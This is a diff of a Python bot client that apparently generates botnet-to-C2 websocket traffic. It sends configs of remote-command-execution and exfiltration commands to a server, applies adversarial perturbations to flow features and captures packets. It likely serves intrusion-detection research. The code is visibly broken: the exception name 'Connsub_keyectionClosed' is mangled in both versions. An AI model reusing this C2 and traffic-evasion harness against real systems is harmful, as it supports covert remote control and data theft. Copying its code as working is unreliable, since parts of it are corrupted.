@@ -26,10 +26,10 @@ from get_bot_ready import get_traffic_generation_configuration, generate_atomic_
 
 
 class persistent_connection_via_websocket():
-    def __init__(self, client_config):
-        self.client_config = client_config
-        self.server = "localhost"
-        self.server_port = 5000
+    def __init__(self, bot_config, server="localhost", server_port=5000):
+        self.bot_config = bot_config
+        self.server = server
+        self.server_port = server_port
     def generate_random_string(self,size):
         return ''.join(random.choices(string.ascii_letters + string.digits, k=size))
     async def rce(self, websocket, command):
@@ -54,7 +54,7 @@ class persistent_connection_via_websocket():
         uri = f"ws://{server}:{server_port}"
         async with websockets.connect(uri) as websocket:
             self.websocket = websocket
-            await websocket.send(json.dumps(self.client_config)) # send final client config including rce/exfil and adversarial to server
+            await websocket.send(json.dumps(self.bot_config)) # send final client config including rce/exfil and adversarial to server
 
             # send config to server 
             while True:
@@ -119,7 +119,7 @@ def stop_tcpdump( process):
         os.killpg(os.getpgid(process.pid), signal.SIGTERM)
         #await process.wait()
 
-def bot_activity_conf_generator(config_file_addr:str= "websocket/config.yaml",**kwargs):
+def bot_activity_conf_generator(config_file_addr:str,**kwargs):
     input_kwargs = kwargs
     termination = {}
     cnf_gen= config_generator(config_file_addr)
@@ -146,22 +146,22 @@ async def main():
     traffic_generation_config = get_traffic_generation_configuration() 
     print("===============Traffic Generation Configuration:===============")
     print(traffic_generation_config)
-    print("==================================================")
+    print("================================================================")
 
     # loading bot_activitiy.yaml including commands to be executed on victim for system discovery or the data should be exfiled
     script_dir = Path(__file__).parent.parent
-    conf_path = script_dir  / "configs" / "bot_activity.yaml"
+    bot_activitiy_conf_path = script_dir  / "configs" / "bot_activity.yaml"
 
     # start capturing traffic if user asked for traffic collection and save in the following folder
     if traffic_generation_config["capture_pcap"]:
         current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        tcpdump_process = start_tcpdump(traffic_generation_config["pcap_interface"], f"{traffic_generation_config["pcap_save_path"]}/{current_time}.pcap")
+        tcpdump_process = start_tcpdump(traffic_generation_config["pcap_interface"], f"{traffic_generation_config['pcap_save_path']}/{current_time}.pcap")
     
     # check if user wanted to realize adevrsarial pertubation values during bot<->C2 communication
     if traffic_generation_config["adversarial"]:
         #set defualt underlaying limit to adversarial features
-        underlay_limit = { 'src2dst_packets': 0, 'src2dst_bytes': 0, 'src2dst_max_ps': 0, 'dst2src_packets': 0, 'dst2src_bytes': 0, 'dst2src_max_ps': 0 }
-
+        #underlay_limit = { 'src2dst_packets': 0, 'src2dst_bytes': 0, 'src2dst_max_ps': 0, 'dst2src_packets': 0, 'dst2src_bytes': 0, 'dst2src_max_ps': 0 }
+        underlay_limit = {}
         # update adversarial feature pertubation values accroding to the input config 
         for key, item in traffic_generation_config["adversarial_config"].items():
             if key in underlay_limit.keys():
@@ -171,16 +171,17 @@ async def main():
                 break
         #generate atomic configs according to the underlaying limit values for each indvidual flow
         atomic_config_list = generate_atomic_combinations(underlay_limit)
+        
         for i, flow_config in enumerate(atomic_config_list):
 
-            # get randomly selected list of commands (Remote Command Execution and Exfiltration)     
-            bot_config = bot_activity_conf_generator(config_file_addr=conf_path)
+            # get randomly selected list of commands (Remote Command Execution and Exfiltration) which has been mixed with indvidual atomic config    
+            bot_config = bot_activity_conf_generator(config_file_addr=bot_activitiy_conf_path, **flow_config)
             print(f"=============Iteration {i}============== ")
             print(f"Generated Config:\n{bot_config}\n")
 
             try:
-                bot = persistent_connection_via_websocket(client_config=client_config)
-                await bot.websocket_client(server='10.11.54.137')
+                bot = persistent_connection_via_websocket(bot_config=bot_config)
+                await bot.websocket_client(server=traffic_generation_config["server_ip"], server_port=traffic_generation_config["server_port"] )
 
             except websockets.exceptions.Connsub_keyectionClosed as e:
                 print("Connection closed:", e)
@@ -197,7 +198,33 @@ async def main():
 
             finally:
                 await bot.wait_closed()
-    if capture_flag:
+    elif not traffic_generation_config["adversarial"]:
+        for i in range(traffic_generation_config["flows_count"]): # how many iterations (i.e ä of flows) based on user input
+            # get randomly selected list of commands (Remote Command Execution and Exfiltration)  ==> run without adversarial pertubation  
+            bot_config = bot_activity_conf_generator(config_file_addr=bot_activitiy_conf_path) 
+            print(f"=============Iteration {i}============== ")
+            print(f"Generated Config:\n{bot_config}\n")
+
+            try:
+                bot = persistent_connection_via_websocket(bot_config=bot_config)
+                await bot.websocket_client(server=traffic_generation_config["server_ip"], server_port=traffic_generation_config["server_port"] )
+
+            except websockets.exceptions.Connsub_keyectionClosed as e:
+                print("Connection closed:", e)
+                #stop_tcpdump(tcpdump_process)
+
+            except ConnectionRefusedError:
+                print('Connection refused')
+
+            except ConnectionTimeoutError:
+                print('Connection Timeout')
+
+            except Exception as ex:
+                traceback.print_exc()
+
+            finally:
+                await bot.wait_closed()            
+    if traffic_generation_config["capture_pcap"]:
         stop_tcpdump(tcpdump_process)
     await asyncio.sleep(random.randint(1,2))
 
